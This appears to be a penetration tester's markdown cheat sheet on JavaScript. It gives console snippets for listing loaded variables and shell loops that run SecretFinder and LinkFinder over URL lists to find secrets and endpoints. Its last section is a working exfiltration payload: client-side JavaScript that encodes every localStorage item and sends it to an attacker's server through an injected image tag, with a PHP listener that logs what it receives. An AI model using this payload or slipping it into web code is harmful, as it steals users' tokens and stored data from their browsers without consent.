# All Stuff JS
## Debugging
To list all currently loaded JavaScript variables in the browsers console:   
```
for(var b in window) {
if(window.hasOwnProperty(b)) console.log(b);
}
```
Another method with more output:   
```
var n, arg, name;
console.log("typeof this = " + typeof this);
for (name in this) {
    console.log("this[" + name + "]=" + this[name]);
}
for (n = 0; n < arguments.length; ++n) {
    arg = arguments[n];
    console.log("typeof arguments[" + n + "] = " + typeof arg);
    for (name in arg) {
        console.log("arguments[" + n + "][" + name + "]=" + arg[name]);
    }
}
``` 

## Searching for low hanging fruits
### Secretfinder
`$ for url in $(cat /root/Desktop/urls_js.txt); do python3 SecretFinder.py -i $url -o cli; done`   
Using a proxy:   
`$ for url in $(cat /home/kali/Desktop/urls_js.txt); do python3 SecretFinder.py -i $url -p http://localhost:8080 -o cli; done`    

### Linkfinder
`# for url in $(cat /root/Desktop/urls_js.txt); do python3 linkfinder.py -i $url -o cli; done`   

## Sending Local Storage Items to Remote Server
### JavaScript (client) 
```
newString = "";
for (var a in localStorage) {
    newString += a + "="
    newString += localStorage[a];
    // Encode the String
    var encodedString = btoa(unescape(encodeURIComponent(newString)))
    //console.log(newString);
    //console.log(encodedString);
    document.write('<img src="https://10.10.10.10/attackerswebapp/receiver.php?str='+encodedString+'">');
    newString = "";
}
```
### PHP listener (server)
```
<?php
$encodedstr = $_GET["str"];
$file = fopen('log.txt', 'a');
$string = base64_decode($encodedstr);
fwrite($file, $string . "\n\n");
?>
```
